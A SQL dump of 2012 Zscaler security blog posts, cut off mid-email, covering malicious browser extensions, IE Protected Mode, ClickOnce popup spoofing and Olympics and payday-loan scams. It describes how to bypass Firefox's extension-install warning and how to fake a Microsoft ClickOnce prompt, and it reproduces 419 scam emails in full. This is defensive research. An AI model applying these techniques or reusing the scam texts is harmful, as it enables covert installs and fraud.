INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (278, 'How To Install Silently Malicious Extensions For Firefox', 'Julien Sobrier', 'September 25, 2012', 'Recently, I had the pleasure of presenting on malicious browser extensions at SOURCE Seattle. I showed, amongst other things, how a malicious browser extension can be added silently to any Firefox profile. I\'ve reworked the demonstration, and want to make it available to a wider audience.    3rd-party installation    You have probably already have encountered applications, like the Flash player or some repackaged free software, that wants you to install a toolbar or some spyware/adware for your browser. This is a 3rd-party installation of an extensions. For Firefox, this installation consists of copying the browser extension into your Firefox profile (or a special folder that contains extensions shared by all profiles).         	  		  			  		  		  			Software installer contains a toolbar/adware/spyware extension  		  	        Firefox protects against this type of external extension installation by prompting the user the next time the browser is started - the user has the option to disable (default action) or enable the new extension.                	  		  			  		  		  			Firefox warning for an extension installed outside of the browser  		  	        Silent installation    It is actually very easy to bypass the warning from Firefox. Firefox stores information about all extensions in a Sqlite3 database named extensions.sqlite, located in each Firefox profile. It contains:                     	name, version, description, etc.  	enabled or disabled  	active or not  	installed from official Mozilla extension site or not             	  		  			  		  		  			extensions.sqlite  		  	        When Firefox starts, it checks the list of extensions under /extensions/ against the content of extensions.sqlite. If an extension exists on disk, but is not listed in the database, a warning is shown. The trick to install an extension silently is to add a record into the database about the extension being installed and tell Firefox that the extension has actually already been approved by the user (active and enabled).    Demonstration    I\'ve written a small program that installs an extension silently into any Firefox profile. You can download the program and the extension here, and the source code there.    The program was written in C# and can be compiled with the free Visual Studio Express for .Net from Microsoft.                	  		  			  		  		  			Tool shows the steps to install the extension silently  		  	        The \"malicious\" extension does not actually do anything. All the malicious code has been commented out, although it includes some of the things an attacker could do, such as:                     	steal the list of logins and passwords saved  	send out all the URLs visited by the user  	disable security features      Do not worry about testing the \"malicious\" finctionality, the extension will not do anything - no information will be sent out.    I suggest that you create a custom profile to test the extension. To create a new profile named \"demo\", run the following command:    firefox -CreateProfile demo --no-remote    Then start Firefox with your new profile:    firefox -P demo --no-remote    I\'ve included a video that shows the silent installation in case you\'re fearful of trying it for yourself:                          Why it matters    Many free software packages push toolbars, adware and spyware into Firefox and other browsers, installed as part of their installation to earn some money for the extension creator (see previous PPI campaigns). Firefox gives users a chance to explicitly and clearly decide whether or not they want to enable these add-ons. Without this protection, many users can be tricked into running extensions they were are not aware of.    The second important point is that malicious browser extensions are much harder to detect once installed. Because extensions are part of the browser, their activity cannot be differentiated from the activity of the browser. Accessing the internet and accessing the file system are legitimate actions for the browser. The extension does not need to add itself to the startup scripts, or as a Windows service to be running after a computer reboot. The extension does not need to hook into Windows to intercept logins and passwords, etc. Finally, AV vendors struggle with detecting malicious JavaScript and any of the malicious Firefox extensions I\'ve checked with VirusTotal were never flagged.      Going further    The silent installation could be even more sneaky. Instead of adding a new extension, it could also replace an existing extension, or append itself to an existing extension.', 'Analysis', 'https://www.zscaler.com/blogs/research/how-install-silently-malicious-extensions-firefox');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (279, 'Internet Explorer Protected Mode In Windows 8', 'Julien Sobrier', 'September 17, 2012', 'Microsoft Introduced Protected Mode in Internet Explorer with Windows Vista in 2006. With Windows 8, Microsoft added Enhanced Protected Mode. Protected Mode aims to keep users safe by restricting what BHOs (Browser Helper Objects, aka browser extensions) and plugins can do inside Internet Explorer.Protected Mode enabled by default in IE 9Protected ModeBefore I talk to the changes made in Windows 8, let me explain what Protected Mode does in Internet Explorer versions 7 through 9, especially when it comes to browser extensions. Internet Explorer, along with any extensions and plugins, run with a low integrity. This means that they have limited access to the system: read/write access to the file system, the registry and limited ability to run executables.Limitations Internet Explorer extensions have write access to /AppData/LocalLow and a few folders useed by Internet Explorer to store cookies and favorites. Any untrusted application can write to LocalLow without triggering any User Account Control (UAC) violations, including applications deployed with ClickOnce. Zscaler Safe Shopping for Internet Explorer for example, creates a sub-directory in LocalLow to store the list of fake stores.Extensions can run executables that have a low integrity only. Windows applications have a medium integrity, which means that Internet Explorer cannot run any application without an explicit permission from the user (UAC popup). An extension can therefore only launch an application with a low integrity, which means that it will have limited system access.Write  access to the registry is also limited. An extension can write to the registry only under HKEY_CURRENT_USER\\Software\\AppDataLow\\Software.Read accessProtected mode does however give read access to the entire file system. A malicious extension could therefore upload all your important files under My Documents to a malicious server, for example.Integrity elevationIt is possible to run an executable of a higher integrity by setting up an Integrity Elevation Policy. Basically, an entry is added to the registry to specify which executable should be run by a low integrity process at a higher integrity, without raising a UAC popup. This entry has to be added as an Administrator. It cannot be added from within Internet Explorer.Windows 8Windows 8 introduces Enhanced Protected Mode to fill some of the security gaps of the current Protected Mode. The most important change is a limit on read access. Read access to the file system and Registry are more restricted. Unfortunately, this new Protected Mode breaks many existing plugins. Microsoft has therefore decided to turn off Enhanced Protected Mode for Internet Explorer by default. So, by default, Windows 8 and Internet Explorer 10 do not offer any additional protection against data leakage by malicious browser extensions.The most important take away from this is that Protected Mode still lets lets all extensions read the entire file system and arbitrary applications can be launched silently.', 'Microsoft', 'https://www.zscaler.com/blogs/research/internet-explorer-protected-mode-windows-8');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (280, 'Beware Of IPhone5 Scams', 'ThreatLabz', 'September 13, 2012', 'Following Apple\'s announcement of the iPhone 5 yesterday, we have certainly seen a large number of web transactions to domains/URLs related to this subject.  While you may covet the latest and greatest gadget, this is just a friendly reminder to please keep in mind that the scammers / fraudsters know this desire and are using it in their social engineering lures.             A quick peek at some of the sites this morning, most appear to be \"pay-per-click\" / CPA style schemes in which the scammer monetizes clicks as well as gathers information about potential victims via surveys.  The lures include things win an iphone 5 \"contest\" or get one free for doing testing:                                       Beware of iPhone5 scams.  We will update this post as any \"new\" / unique scams or malware delivery are uncovered with this iPhone5 social engineering lure.', 'Phishing', 'https://www.zscaler.com/blogs/research/beware-iphone5-scams');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (281, 'Abusing ClickOnce', 'Julien Sobrier', 'September 07, 2012', 'Many web-based attacks try to fool the users into installing a malicious executable by faking a native application: fake AV, fake Flash updates, etc. These pages are well designed, but you can always tell it is not a native application running.In a previous post, I described the ClickOnce deployment for Internet Explorer. ClickOnce is a a way to easily deploy applications on Windows computers. When a user clicks on a link that points to a ClikckOnce deployment, a new popup is opened. This popup is very different from any popup or window opened by Internet Explorer. If the user clicks on Install, the executable is downloaded and executed in a single step, without a way to cancel the installation at any point.If the user minimizes the browser, the popup remains visible on the screen. The ClickOnce popup is a native application and it is therefore independent from the browser.ClickOnce popupClickOnce would provide a great opportunity to trick Internet Explorer users into installing software. There are three fields displayed in the popup and they can all be abused to look like the user is going to install legitimate software from a legitimate vendor:Name: Supposed to be the name of the software being installed. In my example, I set it to \'Windows Update\'.From: Domain where the software will be downloaded from. The space is limited. Although the most important part of a domain is on the right side (TLD and top-domain), the right side is actually truncated. Use a very long domain, as I did in the example shown and it looks like the  software is hosted on a sub-domain of microsoft.com (click on the image above to get a bigger version, and check the From domain).Publisher: Who created the software. The Publisher is taken from the code signing certificate that was used to sign the ClickOnce deployment. An attacker can use a legitimate certificate with a name that sounds legitimate, or use a stolen code signing certificate (like Flamer). A self-signed certificate can be used to get the Publisher name as Microsoft, for example, but a red warning would be shown on the popup. Unfortunately, the red shield warning may not adequately scare users away...It is pretty easy to create a ClickOnce deployment for any executable. The web server simply needs to send a specific MIME type, which is also easy to configure. I have not seen any broad attacks using this method. It is however something to keep an eye on as it would be a rather effective tool for social engineering attacks against end users.', 'Microsoft', 'https://www.zscaler.com/blogs/research/abusing-clickonce');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (282, 'Are You Vulnerable To The Latest Java 0-day Exploit? (Updated)', 'Julien Sobrier', 'August 28, 2012', 'Test to see if you\'re vulnerable.       You may be aware that a 0-day vulnerability in the latest version of Java is presently being exploited on the Web. This vulnerability affects all versions of Java 1.7 (aka Java 7). Oracle has not yet released a fix and if they stick to their quarterly patch cycle, one isn\'t likely to emerge until October.    Java has a long history of 0-day vulnerabilities being actively exploited. Exploits are usually drive-by attacks: users get infected by navigating to hijacked websites where an invisible Java applet drops a malicious executable on the user\'s machine. The very popular, Blackhole exploit kit includes numerous Java exploits.    In 2010, we reported a 300% increase of malicious JAR (Java archive) files. Recently, in March 2012, Java made the news due to the Flashback Trojan, a piece malware targeting an older Java version that shipped with Mac OS X. As can be seen, Java is constantly under attack.    Update: new Java version available    Oracle has released java 1.7.7 and 1.6.35 to fix the vulnerability. You can update your java version from Java.com.    We have updated our Java test page to take the new versions into account.    Are you vulnerable?    The latest iteration of Java is version 1.7 revision 6. This is now the default version on Windows. Mac OS X still uses Java 1.6 (latest version: 1.6.33). Java 1.6.33 is NOT vulnerable to the latest 0-day exploit. However, I would not suggest that anybody downgrade from Java 1.7 to Java 1.6 as it is not yet known if version 1.6 is vulnerable to other flaws fixed in 1.7.    One annoying fact with Java is that new versions are installed on top of each other. As such, you are likely to have multiple versions of Java installed on your system. Internet Explorer may not even be using the latest version of Java that you have installed.    We have created a new page to list all of the versions of Java installed on your computer. You can test your browser here.    Disable Java    To be on the safe side, you can disable Java in your browser to prevent malicious applets from running.    Firefox    Go to Tools - Add-ons - Plugins    Look for Java Deployment Toolkit and/or Java Platform SE. Disable them all.       	  		  			  		  		  			Java disabled in Firefox  		  	      Chrome    Go to Wrench -  Settings and Show advanced settings... - Privacy and Content settings - Plug-ins - Disable individual plug-ins... - Java - disable. It is quite difficult to find!       	  		  			  		  		  			Java enabled in Chrome  		  	      Internet Explorer    Go to Tools - Manage Add-ons. Disable Java(tm) Plug-in SSV Helper and Java(tm) Plug-in 2 SSV Helper.              	  		  			  		  		  			Java disabled in Internet Explorer 9  		  	    Update: To completely disable Java in Internet Explorer, follow the steps at http://www.kb.cert.org/vuls/id/636312#disable_java_in_IE.      Test it    Now go to our Java test page (updated) to ensure that Java has indeed been disabled in your browser.    Click to Play    If you need Java occasionally, you can enable it on-demand with Click to Play. I described Click to Play, a way to manually enable plugins only on visible content, in a previous post. This feature is only available in Firefox, Chrome and Opera.    Firefox also offers several browser extensions to easily enable/disable java with one click. I personally like Quick Java.    Take this opportunity to check all the plugins running in your browser and disable the plugins that you do not really need. Don\'t give the bad guys an attack surface that\'s any larger than it needs to be!', 'Zero Day', 'https://www.zscaler.com/blogs/research/are-you-vulnerable-latest-java-0-day-exploit-updated');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (283, 'Payday Loan Scam', 'Julien Sobrier', 'August 24, 2012', 'Weebly is a free platform for website creation. Like many free hosting and DNS providers, it is abused by spammers and scammers. Recently, I found over 400 .weebly.com sub-domains advertising \"instant cash loans\" and redirecting users to http://paydayloanswww.com/.instatncashloansandiegocacalegal.weebly.comHere are some of the 400 sub-domains:loanranger.weebly.comfastapprovalsignaturepersonalloa.weebly.com750cashloan.weebly.comamericangeneralfinance1.weebly.com pdlnow-com.weebly.com globalgrouppaydayloans.weebly.comskyloans01.weebly.com privatelendersstudentloansbadcre.weebly.comloansforretired.weebly.compaydayloanswithmoneygram.weebly.cometc. The 400+ weebly.com domains have an identical layout with some text at the top, but the majority of the page is simply a large image showing an application form.the form is actually an imageThe image is also a link to the actual Payday loan website. But instead of linking directly to paydayloanswww.com, they link to \"custom\" shortened URLs. The URLs do not come from legitimate URL shortening services, but rather domains that have been setup by the scammers for the sole purpose of linking to spam/scams. This is a technique used by other spammers, notably fake Canadian Pharmacy, to work around spam filters. Here are some of the domains used for the redirections:eibo.bizh8l.orgzsui.orgg1o2.infopaydayloanswww.com serves as a broker in finding payday loans for customers. Potential borrowers have to fill out 2 forms and provide very sensitive information including a social security number, bank account information, etc.Payday loan form, page 1Payday loan form, page 2From my experience after filling out the form, and from what I gather from many forums, borrowers get a $200 loan, but here is an $89 charge every time the loan is renewed. The renewal happens automatically every nine days and herein lies the scam: it is apparently very hard to get the company to stop the automated renewal. The $200 loan can get very expensive after a few weeks!My loan offer (I asked for $800)The company operates under different names: Brighton Fnl LLC, Kingston Financial, etc. The Better Bureau Business record for Brighton Fnl LLC is not great: eight complaints are currently listed on the BBB website. After sending a few URLs to Weebly, some sub-domains have been taken down, but most are still up. Weebly is fairly young, it does not look like they have the correct tools and processes in place to respond quickly to this kind of spam. I\'ve offered to send them the full list, but I have not heard back from them yet.', 'Phishing', 'https://www.zscaler.com/blogs/research/payday-loan-scam');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (284, 'Zscaler Safe Shopping 1.1 For Internet Explorer: C++ BHO', 'Julien Sobrier', 'August 16, 2012', 'I released Zscaler Safe Shopping for Internet Explorer in March 2012. This was my first attempt at writing a Browser Helper Object (BHO) and it was written in C#. There are are number of disadvantages to using C#, as I described in my last post. C++ is required for \"advanced\" features, like intercepting and modifying all HTTP/HTTPS traffic.    Ultimately, I decided to bite the bullet and to learn C++ on Windows in order to deliver some great extensions for Internet Explorer this year. It was quite a steep learning curve to go from from C# and the scripting languages (Perl, Ruby, etc.) that I knew well, to C++. CodeProject turned out to be a great source of sample code for C++ BHOs. Various colleagues also helped to shorten my learning curve. Now here were are and Zscaler Safe Shopping has been rewritten from scratch in C++. If you are using version 1.0, an upgrade to the new 1.1 will speed up your browsing when the extension is in use. C# BHOs require that the .Net framework be loaded first, which takes at least 0.20s-0.30s for every tab. With C++, load time is significantly reduced.    It is very important that the BHO loads quickly, in under about 0.20s so as to not negatively impact the user experience and avoid warning messages. Starting with Internet Explorer 9.0, a warning is shown to the user when the browser opens to disable \"slow\" add-ons:    	  		  			  		  		  			Warning about slow add-ons  		  	      It is much harder to write browser add-ons for IE than it is for Firefox and Chrome, but you can do quite a lot with IE. Here is the breakdown of the \"advanced\" features available to add-ons on the three major browsers:       	  		  			Feature  			Firefox  			Internet Explorer  			Chrome  		  	  	  		  			Modify HTTP requests and responses  			YES  			YES  			YES  		  		  			Access the file system  			YES  			YES  			NO  		  		  			Include C++ libraries  			YES  			YES*  			NO  		  		  			Run executables  			YES  			YES  			NO  		  		  			Run server inside browser  			YES  			YES  			NO  		  	    (* IE add-ons are C++ libraries, of course)    I plan on releasing some exiting browser add-ons for Internet Explorer this year, keep an eye on this blog!', 'Microsoft', 'https://www.zscaler.com/blogs/research/zscaler-safe-shopping-11-internet-explorer-c-bho');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (285, 'Most Common Threats In Top Blacklisted Sites', 'Julien Sobrier', 'August 07, 2012', 'The vast majority of the most popular blacklisted websites contain a piece of malicious JavaScript inline. These sites were mostly hijacked by attackers and the malicious code can usually be linked to the Blackhole exploit kit.       	  		  			  		  		  			Malicious code found on top blacklisted sites  		  	    I was surprised to find malicious Java applets in second place, having been found on 10% of the blocked sites. Malicious iFRAMEs were the third most prevalent infection and generally resulted from  mass SQL injection attacks. Only 2% of the sites are trying to foil users into downloading a malicious piece of code through a fake AV, Flash or codec page.    The scam and spam sites are mostly survey scams (the-rewardline.com, station-awardz-central.com, channelrewardscenter.org, etc.) and work-from-home scams (financereports.co). These sites have been blocked by Google Safe Browsing for months.    Since most the blocked sites are legitimate sites with high traffic, they quickly get cleaned up and removed from the Google blacklist. While the average number of days a top-site is blocked by Google is 7 days, the graph below shows that the vast majority are blocked for only a few days:       	  		  			  		  		  			   		  	    The number of top-domains blacklisted, can vary considerably on a daily basis, but the trend is upward - from an average of 400 sites in May to more than 1,000 in July.       	  		  			  		  		  			Number of top-websites blacklisted daily by Google  		  	      Here are the top-ranked websites blacklisted by Google since May 2012:         	  		  			Domain  			Alexa rank  			Country  		  		  			blog.com  			681  			PT  		  		  			fatakat.com  			699  			US  		  		  			ziddu.com  			878  			GB  		  		  			warez-bb.org  			1,029  			RU  		  		  			vanguardngr.com  			1,528  			US  		  		  			prlog.org  			1,555  			US  		  		  			damnlol.com  			1,949  			US  		  		  			arabseed.com  			2,002  			US  		  		  			h33t.com  			2,213  			CA  		  		  			geo.tv  			2,606  			GB  		  	        Small or big, popular or not, all websites are under attack. No domain can be fully trusted and you never know if attackers managed to breach the protections of the website that you\'re currently on.', 'Analysis', 'https://www.zscaler.com/blogs/research/most-common-threats-top-blacklisted-sites');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (286, '80% Of \"Olympic\" Domains Are Scams And Spam', 'Julien Sobrier', 'August 03, 2012', 'Today we looked at all identified domains containing the string \"olympics\", which had been accessed by our customers over the course of a day. It turns out that 80% of them are scams or spam and they can be classified into three main categories.Typo squattingSpammers can take advantage of users making mistakes when typing a domain name directly into the browser address bar by purchasing domain names close to their intended target - for example: gooogle.com (3 letter o\'s) or gogle.com (1 letter o) for google.com, yaho.com or yaoo.com for yahoo.com, etc.The main target of typo squatting in the US is the official NBC site for the Olympics: nbcolympics.com. Here are the domains that capitalize on user mistakes:cnbcolympics.com (extra c)nbcolympic.com (missing s in olympics)wwwnbcolympics.com (missing dot between www and nbcolympics.com)msnolympics.com (msn instead on nbc)nbolympics.com (missing c in nbc)nbcolympics.org (.org instead of .com)nnbcolympics.com (2 n\'s in nbc)mbcolympics.com (m instead of n in nbc)ncbolympics.com (c and b inverted in nbc)These domains are mostly parked. They are covered with advertising in the hope that users will click on one of those links since there is no useful content on the page.cnbcolympics.comDomain names cost only about $10 and hosting can be free, so this can an effective way to make some money with a minimal initial investment.\"TV on PC\" scamScams for receiving Cable/Satellite TV on a PC for a very low monthly fee are not new. Scammers are taking advantage of the Olympics to attract people who are ready to spend a few bucks to watch the games in real time.Numerous pages, mostly parked on free hosting sites are created to redirect users to the TV scams. These redirection pages may be designed as reviews from users promoting the scam, or simple HTTP redirection scripts with no content actually displayed to the victim.This technique is used by the largest number of \"olympics\" domains:londonolympics2012livestream1.webspawner.comlondon2012olympicslivestreamfreeonline.webspawner.comlondonolympic2012tv.comolympics2012onipad.comwatch2012olympicsonline.puzl.comolympics.gamelivehd.comlondonolympics.chuckduck.infowatcholympics2012live.comwatchsummerolympics.comwatch-olympics-online.infoolympicstv.trueonlinetv.comwatcholympicslivestreams.usolympic2012.livetelecast.usolympics2012london.tkolympic2012.onlinepremiumtv.comolympics2012live.onlinestreamingfree.netlondonolympic.infolondon2012olympicslivestream.sitew.comolympicgames2012livestream.sitew.comwatcholympics2012-openingceremonyonlinefree.sitew.comolympics2012lives.sitew.comlondonolympics2012livestream1.webspawner.comTV scam after redirection: satellitedirect.com\"Made for Adsense\" sites\"Made for Adsense\" (MfA) sites are highly targeted websites that drive web traffic from search engines. They contain enough content to get listed in search engine results for as a specific query. They contain a lot of ads and encourage users click on them in order to get to some of the more interesting content. MfA sites typically have very few pages. Here are some examples related to the Olympic games:olympicstable.com2012-london-olympics-news.com olympic-games-2012-london.comolympicsgames.comolympicgames2012.comnbcolympica.comolympiczone.comMore ads than content: 2012-london-olympics-news.comWe\'ve seen a few other scams - mostly old tricks revisited to fit the Olympic games.software to see the Olympic games that is actually spyware/adware: streamolympicsonline.comsurvey scams: olympics2012videoclips.vidrr.netI guess the good news is that most of the scams are targeting \'low hanging fruit\' and don\'t involve sophisticated exploits.', 'Phishing', 'https://www.zscaler.com/blogs/research/80-olympic-domains-are-scams-and-spam');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (287, 'London Olympics Email Scams (updates)', 'ThreatLabz', 'July 31, 2012', 'In light of the popularity of the Olympics knowing that scammers will come out of the woodwork to take advantage of the event – we\'re continually monitoring for Olympic scams and maliciousness, no matter how unsophisticated.  And so far, unsophisticated has been exactly what we have been seeing.Here is an example of the standard sort of Olympics \"lottery\" pitch that we are seeing from the scammers over email:Scam attachmentBelow are a few updates for what we are currently seeing today:Received: from [216.172.135.113] by web5710.biz.mail.ne1.yahoo.com via HTTPFrom: Lottery Draws Notice [websjod@gmail.com]Reply-To: internetaward166@gmail.comSubject:   View The E-Mail Attachment And Contact Your Claim AgentBody: KINDLY OPEN THE ATTACHED FILEAttachment: 2012 London Olympics Lottery Draws Notice.docScammer email to send data: internetaward166@gmail.com--Received: from [173.245.64.182] by web180804.mail.gq1.yahoo.com via HTTPFrom: London Olympics 2012 [bolympics111@gmail.com]Reply-To: London Olympics 2012 [lon2012.0lympics@london.com]Subject: Read the Attached LetterBody: Read the Attached LetterAttachment: LONDON OLYMPICS LOTTERY.pdfScammer email to send data: lon2012.0lympics@london.com--Received: from [209.73.132.40] by web5717.biz.mail.ne1.yahoo.com via HTTPFrom: LONDON 2012 OLYMPICS LOTTERY [smithed2012@gmail.com]Reply-To: 2012lonolympicsgames@london.comSubject: CongratulationBody: INTERNATIONAL PROMOTIONS LONDON 2012 OLYMPICS LOTTERYAttachment: LONDON 2012 OLYMPICS 1-1.docScammer email to send data: 2012lonolympicsgames@london.com--Received: from smtpout.telepacific.net ([208.57.218.234])From: \"Very.co.uk\"[account@very.co.uk]Subject: Account Bonus for Olympics 2012Body: Dear Customer, Here is a notification that your account is due to be credited.  Click on My Account below to accept this offer and also get a discount for the Olympics 2012.Link: hxxp://contabilidadpymes.cl/images/login/en/index.htmlThis is a phishing page for very.co.uk online shopping site.Very.co.uk phish page using Olympics as a driver--Received: from [67.195.23.211] by web184804.mail.gq1.yahoo.com via HTTPFrom: LONDON OLYMPICS 2012 INTERNET LOTTERY ANNIVERSARY [i.olympic2012@london.com]Reply-To: LONDON OLYMPICS 2012 INTERNET LOTTERY ANNIVERSARY [revgraigjon01@gmail.com]Subject: You have won from London Olympic 2012Body: Open the attachmentAttachment: LONDON OLYMPICS 2012.docScammer emails: revgraigjon01@gmail.com, unclaimrevgraig@consultant.com--Received: from User ([217.16.182.244]) by redwood-mtg.comFrom: \"Mrs. Linda Joseph\"[webinfo66@yahoo.com]Subject: London 2012 Olympics Lottery WinnerReturn-Path: webinfo66@yahoo.comBody: basic scam email asking for victim banking info to be returned in order to claim winnings (summarized due to length)Scammer email: webinfo66@yahoo.it--In addition to these, I’ve seen reports of scams using image files (e.g., JPGs) to by-pass content inspection checks (a common practice among scammers/spammers) containing the same sort of instructions for victims to send their banking information in order to claim their winnings.In addition to scams, we have seen everything from gambling sites, online shops, TV/streaming services, news / social media sites, and even a florist sending email promotions using the Olympics as a marketing driver.I will make updates to this post with anything new that I see over email throughout the Olympics, additionally I will make a separate post on the web angle.', 'Uncategorised', 'https://www.zscaler.com/blogs/research/london-olympics-email-scams-updates');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (288, 'London Olympics: Stay Away From Scams, Data Theft And Phishing', 'ThreatLabz', 'July 28, 2012', 'The Summer Olympics in London have kicked off and cyber criminals, spammers and data thieves are wasting no time, capitalizing on Olympic related scams.  Currently, the volume of websites selling bogus Olympic tickets are on the rise. These sites normally propagate their campaings though unsolicited ad banners, popups, social networking sites and email messages. Let us examine one such site in detail.    This bogus site is liveolympictickets(dot)net, which also has a Facebook page as shown below:                          The website claims to sell official tickets for the London Olympics. As you can see from the screen shots below, they have tried to retain the same  aesthetics as the official London 2012 site: [http://www.london2012.com/].  This bogus site allows you to add items to your shopping cart, checkout and pay using a credit card. It works just like any other normal ecommerce website.              The site also has external links which redirect to other websites that have the same kind of bogus tickets offers. Some of these sites include pay-per-click scams.                Let us try to examine what is happening in the background. When you type in your personal details such as email, address, phone no. etc., they get sent via plain text (no encryption). The same applies when credit card details are sent, exposing them on the network.                These websites do not have adequate security mechanisms in place, visiting and entering private information could lead to information leakage/theft. This website is just a needle in the haystack. There are numerous such sites which try to market fake promotions/live streaming/tickets.       Stay away from these websites. The official London Olympics site maintains a list of websites which are known to sell fake tickets, check them before buying any tickets: [http://www.london2012.com/spectators/tickets/ticket-checker/].     If you are concerned about the legitimacy of a website, Zulu, Zscaler\'s cloud based URL risk analyzer can be used to check for malicous/spam/phishing sites etc. Visit [http://zulu.zscaler.com] for more Information.', 'Data Breach', 'https://www.zscaler.com/blogs/research/london-olympics-stay-away-scams-data-theft-and-phishing');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (289, 'London Olympics 2012: Prime Time For Spammers', 'ThreatLabz', 'July 27, 2012', 'Spammers love major events as they present an opportunity to social engineer victims with content that they’re likely to be interested in. The Olympics represent a golden opportunity for spammers – the world’s largest sporting event, that will draw a global audience for the next two weeks. As such, we expect to see a plethora of Olympic related scams, which are already beginning to emerge.  Below is an example of an email message that has been circulating that is essentially an Olympic themed version of the ever-popular Nigerian 419 email scam.      From: LONDON 2012 OLYMPICS LOTTERY PROMOTION [mailto:johnwilliamsa2011@gmail.com]  Sent: 15 July 2011 01:09 PM  To: undisclosed recipients:  Subject: CONGRATULATION!         PLEASE OPEN THE ATTACHED FILE    LONDON 2012 OLYMPICS LOTTERY PROMOTION!    The London 2012 Olympics lottery is proud to inform you that you have won £1,950,000.00 GBP (One Million Nine Hundred and Fifty Great Britain Pounds) why you have won? Your e-mail address is one of 15 lucky addresses who have won in the monthly promotion.    We wish to congratulate you on your victory; winners shall be paid in accordance with his/her settlement center. Stated below are your identification numbers:  Batch number: 18/006/1094/lipda/sl,  Reference number: lli/240142/011,  Pin: 2012, file number: flie//5612/1364.  Security code: olylon2012,    FILL THE DETAILS REQUESTED:    1. YOUR FULL NAME………………………………………...  2. YOUR COUNTRY NAME………………………………….  3. MOBILE NUMBER…………………………………………  4. OCCUPATION………………………………………………  5. FAX NUMBER………………………………………………  6. PASSPORT COPY OR ID…………………………………  7. BATCH NUMBE…………………………………………..  8. REFERENCE NUMBER……………………………………  9. PIN NUMBER……………………………………………….  10. FILE NUMBER……………………………………………..  11. SECURITY CODE………………………………………….  12. DATE OF BITH……………………………………………. .    The London 2012 Olympics lottery team, whereby all winners are selected computer ballot draws or server, this email draw or server visits all internet providers and email address around the globe, be it COM, ORG, NET, AOL and all country based web abbreviations, as you have .CA in Canada and .UK in United Kingdom and AOL in USA .ZA in South Africa and India .IN    Remember, you must contact your claim agent Mr. Richards Lord by email or through his office telephone number to make your claim of this great winning prize known to him, with the above requested information.    CONTACT YOUR CLAIM AGENT IN LONDON, UNITED KINGDOM.  MR. RICHARDS LORD  TELEPHONE PHONE: +44 703 174 9631  EMAIL: londonolympic_2012@hotmail.com    You have to note that the London 2012 Olympics Lottery is creating awareness of the Olympics sprit around the world, which is to be host in United Kingdom.    Online Lottery’s Operator, works in collaboration with the London 2012 Olympics Board to ensure that the most effective service is offered to the Lottery winners - within the responsible gaming framework at all times.    MRS. LINDA ROSE.  PROMOTION MANAGER.  LONDON 2012 OLYMPICS LOTTERY AWARD.  COUNTRY: UNITED KINGDOM.         Sample-1              The message is a perfect example of a 419 scam. It asks for personal information and informs you that you’re the recipient of a tremendous financial prize. Below is yet another example.         From: LONDON 2012 OLYMPICS PROMOTION [mailto:uk2012olympics@london.com]  Sent: 01 March 2012 11:49 PM  To: undisclosed recipients:  Subject: 2012 LONDON OLYMPICS E-MAILSSELECT PROMOTION         Head Office    London 2012    One Churchill Place    Canary Wharf    London E14 5LN         LONDON OLYMPICS EVENT AWARENESS AND PROMOTION COMPANY.         2012 London Olympics lottery draw notice     This is to inform you that London Olympics event awareness and promotion company, and London 2012 summer Olympics Organizing Committee (LSOOC) here in London (U.K), has held an Internet Raffle Draw among all internet e-mail users, and your e-mail address was among the 10,000,000.00 (Ten million) e-mail addresses that was picked by the computer during the Second Quarter Raffle Draw (SQRD).         We are therefore with great pleasure, to notify you that your e-mail address once again, happened to come out top number (1) out of the 10,000,000.00.(Ten million) e-mail addresses on the final ballot draw.     Please note that this has made you the jackpot winner of the sum of GBP£ 1,000,000.00 (One Million British Pounds) and free entrance tickets to watch the games live in London.          Be aware that this Internet Raffle Draw (IRD) was organized by  London Olympics event awareness and promotion company.and London 2012 summer Olympics Organizing Committee (LSOOC), to create awareness to the world, as England is finalizing their preparation for the hosting of the 2012 summer Olympics.         BELOW ARE YOUR WINNING DETAILS:    COMPUTER DRAW NUMBER: 177    EMAIL CODE NUMBER: TTYEEWSSE2211775643000    FINAL JACKPOT NUMBER: 0001  SN: 2012 / LSOOC / LOC / UK     WINNING INSURANCE POLICY NUMBER: JJA23UK    WINNING FUNDS INSURANCE COMPANY: NFU MUTUAL LONDON    REFERENCE NUMBER: EAASL/941OY1/04    BATCH NUMBER: 12/27/Du34    WINNING NUMBER: 3         Note that this program is being sponsored by below listed U.K companies:    1. Vodafone company U.K Limited  2.Fenchurch communications U.K Limited  3.Business mobile U.K Limited     Mr. Kuash Behler, Our First Quarter Winner of    GBP£ 2,500,000.00 from Amsterdam, Holland.         Our Second Quarter Winner Mrs. Ali Fatima from Nepal receiving her winning cheque of GBP£1,000,000.00 also on the picture is her husband and friends rejoicing    \\With them.       Congratulations from all our staff, we also extend our thanks to the Sponsors for being part of our awareness and promotional program.    PRIZE CLAIMING INSTRUCTION:         YOU ARE HEREBY NOTIFIED THAT YOU ARE AMONG THE 7 WINNERS OF THE SUM OF GBP£ 7, 000, 000, 00 (SEVEN MILLION British Pounds) EACH ENTITLED TO RECEIVE GBP£ 1,000,000.00 (ONE MILLION British Pounds)      Your Fund is now deposited with our correspondent Paying Bank (BARCLAY\'S BANK, LONDON) insured in your name for security reasons, you are advised to please keep your winning details very confidential from the members of the public to avoid double claim as your winning/payment will be cancelled should Two (2) claims be submitted under the above specified winning details.    Please note that claiming agents has been appointed in strategic areas around the world to help and ensure an easy and immediate claim to all our lucky winner\'s. We have checked your location and your claiming falls under group B.    You are to call and forward you’re winning details to our appointed and accredited Agent    (MR. M. ROBERT NULL)    Office   Mail:  